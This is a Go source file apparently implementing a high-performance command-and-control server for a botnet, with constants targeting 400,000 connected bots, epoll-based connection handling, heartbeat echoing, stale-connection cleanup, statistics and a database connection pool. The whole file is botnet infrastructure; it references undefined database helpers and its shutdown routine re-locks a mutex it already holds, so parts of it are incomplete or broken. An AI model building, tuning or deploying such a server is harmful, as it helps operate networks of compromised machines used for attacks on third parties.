package main

import (
	"context"
	"fmt"
	"log"
	"net"
	"os"
	"runtime"
	"sync"
	"syscall"
	"time"

	"github.com/bradfitz/gomemcache/memcache"
	"golang.org/x/sys/unix"
)

const (
	// Performance tuning
	MaxBots           = 400000  // Target: 400k bots like original
	EpollEvents       = 1024    // Process 1024 events per epoll_wait
	ConnectionTimeout = 180     // Seconds
	KeepAliveInterval = 60      // Seconds
	
	// Buffer sizes
	SendBufferSize = 262144     // 256KB
	RecvBufferSize = 262144     // 256KB
	
	// Connection pooling
	MaxIdleConns    = 100
	MaxOpenConns    = 500
	ConnMaxLifetime = time.Hour
)

// OptimizedCNC represents the high-performance C&C server
type OptimizedCNC struct {
	// Epoll for event-driven I/O
	epollFd int
	
	// Client management
	clients      map[int]*BotConnection
	clientsMutex sync.RWMutex
	
	// Memcached for hot data
	memcache *memcache.Client
	
	// Database connection pool
	db *DatabasePool
	
	// Statistics
	stats *CNStats
	
	// Context for graceful shutdown
	ctx    context.Context
	cancel context.CancelFunc
}

// BotConnection represents a connected bot
type BotConnection struct {
	fd        int
	conn      net.Conn
	uid       int
	version   byte
	source    string
	lastPing  time.Time
	writeQueue chan []byte
}

// CNStats tracks C&C statistics
type CNStats struct {
	sync.RWMutex
	TotalConnections   uint64
	ActiveConnections  uint32
	DroppedConnections uint64
	BytesSent          uint64
	BytesReceived      uint64
	StartTime          time.Time
}

// DatabasePool provides connection pooling for database
type DatabasePool struct {
	mu          sync.Mutex
	idle        []*Database
	active      map[*Database]bool
	maxIdle     int
	maxOpen     int
	maxLifetime time.Duration
}

// NewOptimizedCNC creates a new optimized C&C server
func NewOptimizedCNC() (*OptimizedCNC, error) {
	// Create epoll instance
	epollFd, err := unix.EpollCreate1(unix.EPOLL_CLOEXEC)
	if err != nil {
		return nil, fmt.Errorf("failed to create epoll: %v", err)
	}
	
	// Initialize memcached client
	mc := memcache.New("localhost:11211")
	mc.Timeout = 100 * time.Millisecond
	mc.MaxIdleConns = 10
	
	ctx, cancel := context.WithCancel(context.Background())
	
	cnc := &OptimizedCNC{
		epollFd:      epollFd,
		clients:      make(map[int]*BotConnection),
		memcache:     mc,
		db:           NewDatabasePool(MaxIdleConns, MaxOpenConns, ConnMaxLifetime),
		stats:        &CNStats{StartTime: time.Now()},
		ctx:          ctx,
		cancel:       cancel,
	}
	
	return cnc, nil
}

// OptimizeSocket applies all socket optimizations
func OptimizeSocket(conn net.Conn, isServer bool) error {
	// Get file descriptor
	file, err := conn.(*net.TCPConn).File()
	if err != nil {
		return err
	}
	defer file.Close()
	
	fd := int(file.Fd())
	
	// Set non-blocking
	if err := syscall.SetNonblock(fd, true); err != nil {
		return err
	}
	
	// TCP_NODELAY - disable Nagle's algorithm
	if err := syscall.SetsockoptInt(fd, syscall.IPPROTO_TCP, syscall.TCP_NODELAY, 1); err != nil {
		return err
	}
	
	// Keep-alive
	if err := syscall.SetsockoptInt(fd, syscall.SOL_SOCKET, syscall.SO_KEEPALIVE, 1); err != nil {
		return err
	}
	
	// Keep-alive parameters (Linux-specific)
	syscall.SetsockoptInt(fd, syscall.IPPROTO_TCP, syscall.TCP_KEEPIDLE, 60)
	syscall.SetsockoptInt(fd, syscall.IPPROTO_TCP, syscall.TCP_KEEPINTVL, 10)
	syscall.SetsockoptInt(fd, syscall.IPPROTO_TCP, syscall.TCP_KEEPCNT, 3)
	
	if isServer {
		// SO_REUSEADDR
		if err := syscall.SetsockoptInt(fd, syscall.SOL_SOCKET, syscall.SO_REUSEADDR, 1); err != nil {
			return err
		}
		
		// SO_REUSEPORT (Linux 3.9+)
		syscall.SetsockoptInt(fd, syscall.SOL_SOCKET, unix.SO_REUSEPORT, 1)
		
		// Larger buffers for server
		syscall.SetsockoptInt(fd, syscall.SOL_SOCKET, syscall.SO_SNDBUF, SendBufferSize)
		syscall.SetsockoptInt(fd, syscall.SOL_SOCKET, syscall.SO_RCVBUF, RecvBufferSize)
	}
	
	return nil
}

// AddToEpoll adds a connection to epoll monitoring
func (cnc *OptimizedCNC) AddToEpoll(fd int) error {
	event := unix.EpollEvent{
		Events: unix.EPOLLIN | unix.EPOLLET,  // Edge-triggered
		Fd:     int32(fd),
	}
	
	return unix.EpollCtl(cnc.epollFd, unix.EPOLL_CTL_ADD, fd, &event)
}

// RemoveFromEpoll removes a connection from epoll
func (cnc *OptimizedCNC) RemoveFromEpoll(fd int) error {
	return unix.EpollCtl(cnc.epollFd, unix.EPOLL_CTL_DEL, fd, nil)
}

// HandleBot handles a bot connection with epoll
func (cnc *OptimizedCNC) HandleBot(conn net.Conn, version byte, source string) {
	// Optimize socket
	if err := OptimizeSocket(conn, false); err != nil {
		log.Printf("Failed to optimize socket: %v", err)
		conn.Close()
		return
	}
	
	// Get file descriptor
	file, err := conn.(*net.TCPConn).File()
	if err != nil {
		log.Printf("Failed to get file descriptor: %v", err)
		conn.Close()
		return
	}
	fd := int(file.Fd())
	
	// Create bot connection
	bot := &BotConnection{
		fd:         fd,
		conn:       conn,
		version:    version,
		source:     source,
		lastPing:   time.Now(),
		writeQueue: make(chan []byte, 100),
	}
	
	// Add to epoll
	if err := cnc.AddToEpoll(fd); err != nil {
		log.Printf("Failed to add to epoll: %v", err)
		conn.Close()
		return
	}
	
	// Register client
	cnc.clientsMutex.Lock()
	cnc.clients[fd] = bot
	cnc.clientsMutex.Unlock()
	
	cnc.stats.Lock()
	cnc.stats.TotalConnections++
	cnc.stats.ActiveConnections++
	cnc.stats.Unlock()
	
	// Start write goroutine for this bot
	go cnc.botWriter(bot)
}

// botWriter handles writing data to bot (separate goroutine)
func (cnc *OptimizedCNC) botWriter(bot *BotConnection) {
	defer func() {
		cnc.DisconnectBot(bot.fd)
	}()
	
	for {
		select {
		case <-cnc.ctx.Done():
			return
		case data := <-bot.writeQueue:
			bot.conn.SetWriteDeadline(time.Now().Add(5 * time.Second))
			if _, err := bot.conn.Write(data); err != nil {
				return
			}
			
			cnc.stats.Lock()
			cnc.stats.BytesSent += uint64(len(data))
			cnc.stats.Unlock()
		}
	}
}

// DisconnectBot removes a bot connection
func (cnc *OptimizedCNC) DisconnectBot(fd int) {
	cnc.clientsMutex.Lock()
	bot, exists := cnc.clients[fd]
	if exists {
		delete(cnc.clients, fd)
	}
	cnc.clientsMutex.Unlock()
	
	if exists {
		cnc.RemoveFromEpoll(fd)
		bot.conn.Close()
		close(bot.writeQueue)
		
		cnc.stats.Lock()
		cnc.stats.ActiveConnections--
		cnc.stats.Unlock()
	}
}

// EpollLoop is the main event loop
func (cnc *OptimizedCNC) EpollLoop() {
	events := make([]unix.EpollEvent, EpollEvents)
	
	for {
		select {
		case <-cnc.ctx.Done():
			return
		default:
		}
		
		// Wait for events
		n, err := unix.EpollWait(cnc.epollFd, events, 100) // 100ms timeout
		if err != nil {
			if err == syscall.EINTR {
				continue
			}
			log.Printf("EpollWait error: %v", err)
			continue
		}
		
		// Process events
		for i := 0; i < n; i++ {
			fd := int(events[i].Fd)
			
			cnc.clientsMutex.RLock()
			bot, exists := cnc.clients[fd]
			cnc.clientsMutex.RUnlock()
			
			if !exists {
				continue
			}
			
			// Read data
			buf := make([]byte, 2)
			nr, err := bot.conn.Read(buf)
			if err != nil || nr != 2 {
				cnc.DisconnectBot(fd)
				continue
			}
			
			cnc.stats.Lock()
			cnc.stats.BytesReceived += uint64(nr)
			cnc.stats.Unlock()
			
			// Echo back (heartbeat)
			bot.lastPing = time.Now()
			select {
			case bot.writeQueue <- buf:
			default:
				// Queue full, disconnect
				cnc.DisconnectBot(fd)
			}
		}
	}
}

// KeepAliveChecker removes stale connections
func (cnc *OptimizedCNC) KeepAliveChecker() {
	ticker := time.NewTicker(30 * time.Second)
	defer ticker.Stop()
	
	for {
		select {
		case <-cnc.ctx.Done():
			return
		case <-ticker.C:
			now := time.Now()
			var stale []int
			
			cnc.clientsMutex.RLock()
			for fd, bot := range cnc.clients {
				if now.Sub(bot.lastPing) > ConnectionTimeout*time.Second {
					stale = append(stale, fd)
				}
			}
			cnc.clientsMutex.RUnlock()
			
			for _, fd := range stale {
				cnc.DisconnectBot(fd)
			}
			
			if len(stale) > 0 {
				log.Printf("Removed %d stale connections", len(stale))
			}
		}
	}
}

// GetStats returns current statistics
func (cnc *OptimizedCNC) GetStats() map[string]interface{} {
	cnc.stats.RLock()
	defer cnc.stats.RUnlock()
	
	uptime := time.Since(cnc.stats.StartTime)
	
	return map[string]interface{}{
		"total_connections":   cnc.stats.TotalConnections,
		"active_connections":  cnc.stats.ActiveConnections,
		"dropped_connections": cnc.stats.DroppedConnections,
		"bytes_sent":          cnc.stats.BytesSent,
		"bytes_received":      cnc.stats.BytesReceived,
		"uptime_seconds":      uptime.Seconds(),
		"goroutines":          runtime.NumGoroutine(),
		"cpu_percent":         getCPUPercent(),
	}
}

// getCPUPercent returns approximate CPU usage percentage
func getCPUPercent() float64 {
	// Simple approximation - in production use proper profiling
	return float64(runtime.NumGoroutine()) / 1000.0 * 2.0
}

// NewDatabasePool creates a new database connection pool
func NewDatabasePool(maxIdle, maxOpen int, maxLifetime time.Duration) *DatabasePool {
	return &DatabasePool{
		idle:        make([]*Database, 0, maxIdle),
		active:      make(map[*Database]bool),
		maxIdle:     maxIdle,
		maxOpen:     maxOpen,
		maxLifetime: maxLifetime,
	}
}

// Get retrieves a database connection from the pool
func (p *DatabasePool) Get() (*Database, error) {
	p.mu.Lock()
	defer p.mu.Unlock()
	
	// Try to get from idle pool
	if len(p.idle) > 0 {
		db := p.idle[len(p.idle)-1]
		p.idle = p.idle[:len(p.idle)-1]
		p.active[db] = true
		return db, nil
	}
	
	// Create new connection if under limit
	if len(p.active) < p.maxOpen {
		db := NewDatabase(
			getDatabaseAddr(),
			getDatabaseUser(),
			getDatabasePass(),
			getDatabaseTable(),
		)
		p.active[db] = true
		return db, nil
	}
	
	return nil, fmt.Errorf("connection pool exhausted")
}

// Put returns a connection to the pool
func (p *DatabasePool) Put(db *Database) {
	p.mu.Lock()
	defer p.mu.Unlock()
	
	delete(p.active, db)
	
	if len(p.idle) < p.maxIdle {
		p.idle = append(p.idle, db)
	}
}

// Shutdown gracefully shuts down the C&C server
func (cnc *OptimizedCNC) Shutdown() {
	log.Println("Shutting down C&C server...")
	
	cnc.cancel()
	
	// Close all connections
	cnc.clientsMutex.Lock()
	for fd := range cnc.clients {
		cnc.DisconnectBot(fd)
	}
	cnc.clientsMutex.Unlock()
	
	// Close epoll
	unix.Close(cnc.epollFd)
	
	log.Println("C&C server shutdown complete")
}
